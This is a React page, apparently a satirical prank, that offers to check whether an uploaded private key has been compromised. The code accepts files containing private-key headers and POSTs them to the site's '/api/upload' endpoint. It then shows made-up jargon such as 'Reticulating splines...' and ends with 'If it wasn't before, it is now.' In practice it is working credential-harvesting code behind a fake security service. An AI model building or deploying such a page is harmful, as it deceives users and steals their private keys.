import { useState, useEffect } from 'react';

export default function Home() {
    const [selectedFileName, setSelectedFileName] = useState('Drag & drop your key file here, or click to select a file.');
    const [showUploadForm, setShowUploadForm] = useState(true);
    const [showThinkingDisplay, setShowThinkingDisplay] = useState(false);
    const [showResultMessage, setShowResultMessage] = useState(false);
    const [jargonText, setJargonText] = useState('Initiating quantum entanglement...');

    const jargon = [
        "De-ionizing quantum encryption matrix...",
        "Reversing the polarity of the neutron flow...",
        "Calibrating blockchain synergies...",
        "Bypassing hyper-threaded firewalls...",
        "Compiling adversarial neural networks...",
        "Normalizing polymorphic data streams...",
        "Querying decentralized oracle for threat vectors...",
        "Verifying cryptographic nonce against temporal paradox...",
        "Reticulating splines..."
    ];

    let jargonInterval;

    const handleFileChange = (event) => {
        if (event.target.files.length > 0) {
            setSelectedFileName(`File selected: ${event.target.files[0].name}`);
        }
    };

    const simulateThinking = () => {
        setShowUploadForm(false);
        setShowThinkingDisplay(true);
        let lastIndex = -1;

        jargonInterval = setInterval(() => {
            let jargonIndex;
            do {
                jargonIndex = Math.floor(Math.random() * jargon.length);
            } while (jargonIndex === lastIndex);
            lastIndex = jargonIndex;
            setJargonText(jargon[jargonIndex]);
        }, 1500);

        const randomDelay = Math.random() * 5000 + 5000; // 5-10 seconds

        setTimeout(() => {
            clearInterval(jargonInterval);
            setShowThinkingDisplay(false);
            setShowResultMessage(true);
        }, randomDelay);
    };

    const handleCheckKey = async () => {
        const fileInput = document.getElementById('file-input');
        const file = fileInput.files[0];

        if (!file) {
            alert('Please select a file first.');
            return;
        }

        const reader = new FileReader();
        reader.onload = async (e) => {
            const text = e.target.result;
            if (text.includes('-----BEGIN PRIVATE KEY-----') || text.includes('-----BEGIN RSA PRIVATE KEY-----') || text.includes('-----BEGIN EC PRIVATE KEY-----') || text.includes('-----BEGIN OPENSSH PRIVATE KEY-----')) {
                const formData = new FormData();
                formData.append('privateKey', file);

                try {
                    await fetch('/api/upload', {
                        method: 'POST',
                        body: formData,
                    });
                } catch (error) {
                    console.error('Upload failed:', error);
                    // Continue with simulation even if upload fails
                }
                simulateThinking();
            } else {
                alert('This does not appear to be a valid private key file.');
            }
        };
        reader.onerror = () => {
            alert('Error reading file.');
        };
        reader.readAsText(file);
    };

    const handleReset = () => {
        setShowResultMessage(false);
        setShowThinkingDisplay(false);
        clearInterval(jargonInterval);
        setShowUploadForm(true);
        document.getElementById('file-input').value = '';
        setSelectedFileName('Drag & drop your key file here, or click to select a file.');
    };

    return (
        <div className="container">
            <h1>Private Key Compromise Checker</h1>
            <p>Upload your private key to check if it has been compromised in any known breaches.</p>

            {showUploadForm && (
                <div id="upload-form">
                    <div className="upload-area" onClick={() => document.getElementById('file-input').click()}>
                        <input type="file" id="file-input" onChange={handleFileChange} />
                        <p>{selectedFileName}</p>
                    </div>
                    <button className="btn" onClick={handleCheckKey}>Check Key</button>
                </div>
            )}

            {showThinkingDisplay && (
                <div id="thinking-display">
                    <div className="spinner"></div>
                    <p id="jargon-text">{jargonText}</p>
                </div>
            )}

            {showResultMessage && (
                <div className="message">
                    <h2>If it wasn't before, it is now.</h2>
                    <button className="btn" onClick={handleReset}>Check Another Key</button>
                </div>
            )}

            <footer>
                &copy; {new Date().getFullYear()} Steven X. Han. All rights reserved.
            </footer>

            </div>
    );
}